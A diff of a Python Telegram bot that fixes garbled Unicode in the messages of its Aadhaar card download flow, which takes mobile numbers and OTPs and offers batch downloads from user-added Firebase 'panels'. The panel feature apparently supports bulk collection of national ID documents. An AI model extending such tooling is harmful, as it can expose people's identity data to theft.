-                "<b>Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂ¢Ã¡Â´ÂÃÂªÃÂ´ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ. Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â! Ã°ÂÂÂ</b>"
+                "<b>ᴀᴀᴅʜᴀᴀʀ ᴄᴀʀᴅ ᴅᴏᴡɴʟᴏᴀᴅ sᴇʀᴠɪᴄᴇ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ.</b>\n"
+                "<b>ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ. ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ʏᴏᴜʀ ᴘᴀᴛɪᴇɴᴄᴇ! 🙏</b>"
                 "</blockquote>",
                 parse_mode='HTML'
             )
@@ -4688,7 +4650,7 @@ class AadhaarBot:
         if created and time.time() - created > SESSION_TIMEOUT:
             self.clear_user_data(uid)
             await update.message.reply_text(
-                f"<b>{emo('Ã¢ÂÂ³')} sÃ¡Â´ÂssÃÂªÃ¡Â´ÂÃÂ´ Ã¡Â´ÂxÃ¡Â´ÂÃÂªÃÂÃ¡Â´ÂÃ¡Â´Â</b>\n"
+                f"<b>{emo('⏳')} sᴇssɪᴏɴ ᴇxᴘɪʀᴇᴅ</b>\n"
                 "<b>/start</b>", parse_mode='HTML')
             return
 
@@ -4700,7 +4662,7 @@ class AadhaarBot:
 
             if not mobile.isdigit() or len(mobile) != 10:
                 await update.message.reply_text(
-                    f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃ¡Â´Â 10-Ã¡Â´ÂÃÂªÃÂ¢ÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â.</b>\n"
+                    f"<b>{emo('❌')} ᴠᴀʟɪᴅ 10-ᴅɪɢɪᴛ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ ʙʜᴇᴊᴏ.</b>\n"
                     "<i>(Format: <code>9876543210</code> ya <code>9876543210|Name</code>)</i>",
                     parse_mode='HTML')
                 return
@@ -4716,14 +4678,14 @@ class AadhaarBot:
             self.update_user_data(uid, 'created_at', time.time())
 
             skip_kb = InlineKeyboardMarkup([
-                [InlineKeyboardButton("ÃªÂÂ±Ã¡Â´ÂÃÂªÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â (Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂ)", callback_data='skip_name', style="primary")],
-                [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ", callback_data='cancel_flow', style="danger")]
+                [InlineKeyboardButton("ꜱᴋɪᴘ ɴᴀᴍᴇ (ᴅᴇꜰᴀᴜʟᴛ ᴍʀ)", callback_data='skip_name', style="primary")],
+                [InlineKeyboardButton("ᴄᴀɴᴄᴇʟ", callback_data='cancel_flow', style="danger")]
             ])
 
             await update.message.reply_text(
-                f"<b>{emo('Ã°ÂÂÂ¤')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â (Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ)</b>\n\n"
+                f"<b>{emo('👤')} ᴀᴀᴅʜᴀᴀʀ ɴᴀᴍᴇ (ᴏᴘᴛɪᴏɴᴀʟ)</b>\n\n"
                 "<blockquote>"
-                f"<b>{emo('Ã°ÂÂÂ±')} Mobile:</b> <code>{mobile}</code>\n\n"
+                f"<b>{emo('📱')} Mobile:</b> <code>{mobile}</code>\n\n"
                 "<b>Aadhaar card par jo Name likha hai wo yahan type karke bhejein.</b>\n\n"
                 "<i>Agar name nahi pata ya default Mr use karna hai, to neeche <b>Skip Name</b> button par click karein.</i>"
                 "</blockquote>",
@@ -4735,20 +4697,20 @@ class AadhaarBot:
             name = text.strip()
             mobile = data.get('mobile')
             if not mobile:
-                await update.message.reply_text("<b>Ã¢ÂÂ Session expire ho gaya. /start se dobara shuru karein.</b>", parse_mode='HTML')
+                await update.message.reply_text("<b>❌ Session expire ho gaya. /start se dobara shuru karein.</b>", parse_mode='HTML')
                 self.clear_user_data(uid)
                 return
             await self._uidai_start_flow(update, ctx, mobile, name=name)
 
         elif stage == 'otp1':
             if not text.isdigit() or len(text) not in (6, 8):
-                await update.message.reply_text("Ã¢ÂÂ 6-digit OTP bhejo. Ya /cancel.")
+                await update.message.reply_text("❌ 6-digit OTP bhejo. Ya /cancel.")
                 return
             await self._uidai_verify_otp1(update, ctx, text.strip())
 
         elif stage == 'otp2':
             if not text.isdigit() or len(text) not in (6, 8):
-                await update.message.reply_text("Ã¢ÂÂ 6-digit OTP bhejo. Ya /cancel.")
+                await update.message.reply_text("❌ 6-digit OTP bhejo. Ya /cancel.")
                 return
             await self._uidai_download_pdf(update, ctx, text.strip())
 
@@ -4757,16 +4719,16 @@ class AadhaarBot:
             resp_name = data.get('uidai_resp_name') or data.get('name')
             if eid:
                 msg = await update.message.reply_text(
-                    f"<b>{emo('Ã¢ÂÂ³')} ÃÂ¢Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...</b>",
+                    f"<b>{emo('⏳')} ɢᴇɴᴇʀᴀᴛɪɴɢ ᴀᴀᴅʜᴀᴀʀ ᴏᴛᴘ...</b>",
                     parse_mode='HTML'
                 )
                 await self._uidai_send_otp2(update, ctx, eid, resp_name, status_msg=msg, max_retries=10)
             else:
-                await update.message.reply_text("<b>Ã¢ÂÂ Session expire ho gaya. /start</b>", parse_mode='HTML')
+                await update.message.reply_text("<b>❌ Session expire ho gaya. /start</b>", parse_mode='HTML')
 
         else:
             await update.message.reply_text(
-                "<b>Ã¢ÂÂ /start</b>", parse_mode='HTML')
+                "<b>❌ /start</b>", parse_mode='HTML')
 
     # ==========================================
     # CALLBACKS
@@ -4786,24 +4748,24 @@ class AadhaarBot:
             return
 
         if is_user_banned(uid):
-            await query.answer("Ã°ÂÂÂ« Banned", show_alert=True)
+            await query.answer("🚫 Banned", show_alert=True)
             return
 
         if query.data == 'download_aadhaar':
             if is_maintenance_mode() and not is_admin(uid):
-                await query.answer("Ã°ÂÂÂ Ã¯Â¸Â Aadhaar Download is currently under maintenance!", show_alert=True)
+                await query.answer("🛠️ Aadhaar Download is currently under maintenance!", show_alert=True)
                 await query.message.reply_text(
-                    f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â</b>\n\n"
+                    f"<b>{emo('🛠️')} ᴀᴀᴅʜᴀᴀʀ ᴅᴏᴡɴʟᴏᴀᴅ ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ</b>\n\n"
                     "<blockquote>"
-                    "<b>Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â ÃÂªs Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â.</b>\n"
-                    "<b>Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂ¢Ã¡Â´ÂÃÂªÃÂ´ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ. Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â! Ã°ÂÂÂ</b>"
+                    "<b>ᴀᴀᴅʜᴀᴀʀ ᴄᴀʀᴅ ᴅᴏᴡɴʟᴏᴀᴅ sᴇʀᴠɪᴄᴇ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ.</b>\n"
+                    "<b>ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ. ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ʏᴏᴜʀ ᴘᴀᴛɪᴇɴᴄᴇ! 🙏</b>"
                     "</blockquote>",
                     parse_mode='HTML'
                 )
                 return
 
             if not data.get('verified'):
-                await query.answer("Ã¢ÂÂ Join all channels first", show_alert=True)
+                await query.answer("❌ Join all channels first", show_alert=True)
                 await self.show_force_join(update, ctx)
                 return
 
@@ -4814,9 +4776,9 @@ class AadhaarBot:
             self.update_user_data(uid, 'created_at', time.time())
 
             await query.message.reply_text(
-                f"<b>{emo('Ã°ÂÂÂ±')} sÃ¡Â´ÂÃÂ´Ã¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃÂ¢ÃÂªsÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â 10-Ã¡Â´ÂÃÂªÃÂ¢ÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ</b>\n\n"
+                f"<b>{emo('📱')} sᴇɴᴅ ʏᴏᴜʀ ʀᴇɢɪsᴛᴇʀᴇᴅ 10-ᴅɪɢɪᴛ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ</b>\n\n"
                 "<blockquote>"
-                "<b>/cancel - Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ</b>"
+                "<b>/cancel - ᴄᴀɴᴄᴇʟ</b>"
                 "</blockquote>",
                 parse_mode='HTML')
 
@@ -4824,7 +4786,7 @@ class AadhaarBot:
             _MEMBERSHIP_CACHE.pop(uid, None)
             nj = await self.check_membership(ctx, uid, force=True)
             if nj:
-                await query.answer(f"Ã¢ÂÂ {len(nj)} channel(s) join nahi kiye", show_alert=True)
+                await query.answer(f"❌ {len(nj)} channel(s) join nahi kiye", show_alert=True)
                 return
             self.set_user_verified(uid, True)
             try:
@@ -4835,14 +4797,14 @@ class AadhaarBot:
 
         elif query.data == 'help':
             if not data.get('verified'):
-                await query.answer("Ã¢ÂÂ Join all channels first!", show_alert=True)
+                await query.answer("❌ Join all channels first!", show_alert=True)
                 await self.show_force_join(update, ctx)
                 return
             await self.help(update, ctx)
 
         elif query.data == 'my_info':
             if not data.get('verified'):
-                await query.answer("Ã¢ÂÂ Join all channels first!", show_alert=True)
+                await query.answer("❌ Join all channels first!", show_alert=True)
                 await self.show_force_join(update, ctx)
                 return
             await self.my_info(update, ctx)
@@ -4851,11 +4813,11 @@ class AadhaarBot:
             eid = data.get('eid')
             resp_name = data.get('uidai_resp_name') or data.get('name')
             if not eid:
-                await query.answer("Ã¢ÂÂ EID data expire ho gaya. Kripya /start se dobara karein.", show_alert=True)
+                await query.answer("❌ EID data expire ho gaya. Kripya /start se dobara karein.", show_alert=True)
                 return
-            await query.answer("Ã°ÂÂÂ Retrying OTP generation...")
+            await query.answer("🔄 Retrying OTP generation...")
             msg = await query.message.reply_text(
-                f"<b>{emo('Ã¢ÂÂ³')} ÃÂ¢Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...</b>",
+                f"<b>{emo('⏳')} ɢᴇɴᴇʀᴀᴛɪɴɢ ᴀᴀᴅʜᴀᴀʀ ᴏᴛᴘ...</b>",
                 parse_mode='HTML'
             )
             await self._uidai_send_otp2(update, ctx, eid, resp_name, status_msg=msg, max_retries=10)
@@ -4864,7 +4826,7 @@ class AadhaarBot:
             mobile = data.get('mobile')
             if not mobile:
                 try:
-                    await query.answer("Ã¢ÂÂ Session expired! /start", show_alert=True)
+                    await query.answer("❌ Session expired! /start", show_alert=True)
                 except Exception:
                     pass
                 return
@@ -4874,14 +4836,14 @@ class AadhaarBot:
         elif query.data == 'cancel_flow':
             self.clear_user_data(uid)
             safe_delete_bg(query.message)
-            await query.message.reply_text("<b>Ã¢ÂÂ Operation cancelled. /start</b>", parse_mode='HTML')
+            await query.message.reply_text("<b>❌ Operation cancelled. /start</b>", parse_mode='HTML')
 
         elif query.data == 'back_menu':
             self.update_user_data(uid, 'awaiting_firebase_add', None)
             self.update_user_data(uid, 'fb_adding_name', None)
             self.update_user_data(uid, 'download_mode', False)
             if not data.get('verified'):
-                await query.answer("Ã¢ÂÂ Join all channels first!", show_alert=True)
+                await query.answer("❌ Join all channels first!", show_alert=True)
                 await self.show_force_join(update, ctx)
                 return
             safe_delete_bg(query.message)
@@ -4893,25 +4855,25 @@ class AadhaarBot:
             if is_admin(uid):
                 self.update_user_data(uid, 'awaiting_broadcast', True)
                 await query.message.reply_text(
-                    f"<b>{emo('Ã°ÂÂÂ¢')} ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â</b>\n\n"
+                    f"<b>{emo('📢')} ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴏᴅᴇ ᴀᴄᴛɪᴠᴇ</b>\n\n"
                     "<blockquote>"
-                    "<b>Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â sÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃÂ´ÃÂ Ã¡Â´ÂÃ¡Â´ÂssÃ¡Â´ÂÃÂ¢Ã¡Â´Â (Ã¡Â´ÂÃ¡Â´ÂxÃ¡Â´Â Ã¡Â´Â¡ÃÂªÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªs, Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â, Ã¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â, sÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ, Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â.) ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´Â ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â.</b>\n\n"
-                    "<b>Ã°ÂÂÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ¢ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â: ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªs Ã¡Â´Â¡ÃÂªÃÂÃÂ ÃÂÃ¡Â´Â 100% Ã¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂsÃ¡Â´ÂÃÂs Ã¡Â´Â ÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ_Ã¡Â´ÂÃ¡Â´ÂssÃ¡Â´ÂÃÂ¢Ã¡Â´Â!</b>"
+                    "<b>ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀɴʏ ᴍᴇssᴀɢᴇ (ᴛᴇxᴛ ᴡɪᴛʜ ᴘʀᴇᴍɪᴜᴍ ᴇᴍᴏᴊɪs, ᴘʜᴏᴛᴏ, ᴠɪᴅᴇᴏ, sᴛɪᴄᴋᴇʀ, ᴇᴛᴄ.) ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ.</b>\n\n"
+                    "<b>🌟 ᴛᴇʟᴇɢʀᴀᴍ ᴜᴘᴅᴀᴛᴇ: ʏᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ᴇᴍᴏᴊɪs ᴡɪʟʟ ʙᴇ 100% ᴘʀᴇsᴇʀᴠᴇᴅ ꜰᴏʀ ᴀʟʟ ᴜsᴇʀs ᴠɪᴀ ᴄᴏᴘʏ_ᴍᴇssᴀɢᴇ!</b>"
                     "</blockquote>\n\n"
-                    "<b>sÃ¡Â´ÂÃÂ´Ã¡Â´Â /cancel Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ.</b>",
+                    "<b>sᴇɴᴅ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ.</b>",
                     parse_mode='HTML')
         elif query.data == 'admin_ban':
             if is_admin(uid):
                 await query.message.reply_text(
-                    "<b>Ã°ÂÂÂ« /ban <user_id></b>", parse_mode='HTML')
+                    "<b>🚫 /ban <user_id></b>", parse_mode='HTML')
         elif query.data == 'admin_unban':
             if is_admin(uid):
                 await query.message.reply_text(
-                    "<b>Ã¢ÂÂ /unban <user_id></b>", parse_mode='HTML')
+                    "<b>✅ /unban <user_id></b>", parse_mode='HTML')
         elif query.data == 'admin_user_info':
             if is_admin(uid):
                 await query.message.reply_text(
-                    "<b>Ã°ÂÂÂ /userinfo <user_id></b>", parse_mode='HTML')
+                    "<b>📋 /userinfo <user_id></b>", parse_mode='HTML')
         elif query.data == 'admin_daily_stats':
             if is_admin(uid):
                 await self.admin_daily_stats(update, ctx)
@@ -4920,18 +4882,18 @@ class AadhaarBot:
                 cur = is_maintenance_mode()
                 new_status = not cur
                 set_maintenance_mode(new_status)
-                status_str = "Ã°ÂÂÂ´ ON" if new_status else "Ã°ÂÂÂ¢ OFF"
+                status_str = "🔴 ON" if new_status else "🟢 OFF"
                 try:
                     await query.answer(f"Maintenance mode set to {status_str}", show_alert=True)
                 except Exception:
                     pass
                 await self.show_admin_panel(update, ctx)
             else:
-                await query.answer("Ã¢ÂÂ You are not authorized!", show_alert=True)
+                await query.answer("❌ You are not authorized!", show_alert=True)
 
         elif query.data.startswith('admin_firebases_'):
             if not is_admin(uid):
-                await query.answer("Ã¢ÂÂ You are not authorized!", show_alert=True)
+                await query.answer("❌ You are not authorized!", show_alert=True)
                 return
             page_str = query.data.replace('admin_firebases_', '')
             try:
@@ -4942,7 +4904,7 @@ class AadhaarBot:
 
         elif query.data.startswith('admin_delfb_'):
             if not is_admin(uid):
-                await query.answer("Ã¢ÂÂ You are not authorized!", show_alert=True)
+                await query.answer("❌ You are not authorized!", show_alert=True)
                 return
             payload = query.data[len('admin_delfb_'):]
             r_idx = payload.rfind('_')
@@ -4958,12 +4920,12 @@ class AadhaarBot:
                 page = 0
 
             await asyncio.to_thread(delete_firebase, fb_id, None)
-            await query.answer("Ã°ÂÂÂ Firebase panel delete kar diya gaya!", show_alert=True)
+            await query.answer("🗑 Firebase panel delete kar diya gaya!", show_alert=True)
             await self.admin_list_firebases(update, ctx, page=page)
 
         elif query.data == 'admin_back_menu':
             if not is_admin(uid):
-                await query.answer("Ã¢ÂÂ You are not authorized!", show_alert=True)
+                await query.answer("❌ You are not authorized!", show_alert=True)
                 return
             try:
                 await query.message.delete()
@@ -4978,24 +4940,24 @@ class AadhaarBot:
                 pass
 
         # ============================================
-        # FIREBASE Ã¢ÂÂ Download via Firebase button
+        # FIREBASE — Download via Firebase button
         # ============================================
         elif query.data == 'fb_download_all_panels':
             self.update_user_data(uid, 'awaiting_firebase_add', None)
             self.update_user_data(uid, 'fb_adding_name', None)
             self.update_user_data(uid, 'download_mode', False)
             if is_maintenance_mode() and not is_admin(uid):
-                await query.answer("Ã°ÂÂÂ Ã¯Â¸Â Aadhaar Download is currently under maintenance!", show_alert=True)
+                await query.answer("🛠️ Aadhaar Download is currently under maintenance!", show_alert=True)
                 return
             if uid not in _VERIFIED_USERS_CACHE:
                 nj = await self.check_membership(ctx, uid, force=True)
                 if nj:
-                    await query.answer("Ã¢ÂÂ Join all channels first", show_alert=True)
+                    await query.answer("❌ Join all channels first", show_alert=True)
                     await self.show_force_join(update, ctx)
                     return
                 self.set_user_verified(uid, True)
             if self.active_batches.get(uid):
-                await query.answer("Ã¢ÂÂ Ã¯Â¸Â Batch download already running! Send /cancel to stop.", show_alert=True)
+                await query.answer("⚠️ Batch download already running! Send /cancel to stop.", show_alert=True)
                 return
 
             # User ka apna firebase list dikha
@@ -5004,18 +4966,18 @@ class AadhaarBot:
 
             if not fbs:
                 text = (
-                    f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â</b>\n\n"
+                    f"<b>{emo('🔥')} ᴀᴅᴅ ʏᴏᴜʀ ꜰɪʀᴇʙᴀsᴇ</b>\n\n"
                     "<blockquote>"
-                    "<b>ÃÂ´Ã¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â.</b>\n"
-                    f"<b>Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â {emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃÂ.</b>"
+                    "<b>ɴᴏ ꜰɪʀᴇʙᴀsᴇ sᴀᴠᴇᴅ ʏᴇᴛ.</b>\n"
+                    f"<b>ᴄʟɪᴄᴋ {emo('➕')} ᴀᴅᴅ ꜰɪʀᴇʙᴀsᴇ ᴛᴏ ᴀᴅᴅ ʏᴏᴜʀ ᴜʀʟ.</b>"
                     "</blockquote>"
                 )
             else:
                 total_pages = max(1, (len(fbs) + 19) // 20)
                 text = (
-                    f"<b>{emo('Ã°ÂÂÂ¥')} sÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â (1/{total_pages})</b>\n\n"
+                    f"<b>{emo('🔥')} sᴇʟᴇᴄᴛ ʏᴏᴜʀ ꜰɪʀᴇʙᴀsᴇ (1/{total_pages})</b>\n\n"
                     "<blockquote>"
-                    "<b>Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´ Ã¡Â´ÂÃÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂÃ¡Â´ÂÃ¡Â´Â.</b>"
+                    "<b>ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ꜰɪʀᴇʙᴀsᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ ꜰʀᴏᴍ.</b>"
                     "</blockquote>"
                 )
             try:
@@ -5033,10 +4995,10 @@ class AadhaarBot:
             if not fbs:
                 kb = self.get_firebase_selection_keyboard(uid, page=0, fbs=fbs)
                 text = (
-                    f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â</b>\n\n"
+                    f"<b>{emo('🔥')} ᴀᴅᴅ ʏᴏᴜʀ ꜰɪʀᴇʙᴀsᴇ</b>\n\n"
                     "<blockquote>"
-                    "<b>ÃÂ´Ã¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â.</b>\n"
-                    f"<b>Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â {emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃÂ.</b>"
+                    "<b>ɴᴏ ꜰɪʀᴇʙᴀsᴇ sᴀᴠᴇᴅ ʏᴇᴛ.</b>\n"
+                    f"<b>ᴄʟɪᴄᴋ {emo('➕')} ᴀᴅᴅ ꜰɪʀᴇʙᴀsᴇ ᴛᴏ ᴀᴅᴅ ʏᴏᴜʀ ᴜʀʟ.</b>"
                     "</blockquote>"
                 )
             else:
@@ -5044,9 +5006,9 @@ class AadhaarBot:
                 page = max(0, min(page, total_pages - 1))
                 kb = self.get_firebase_selection_keyboard(uid, page=page, fbs=fbs)
                 text = (
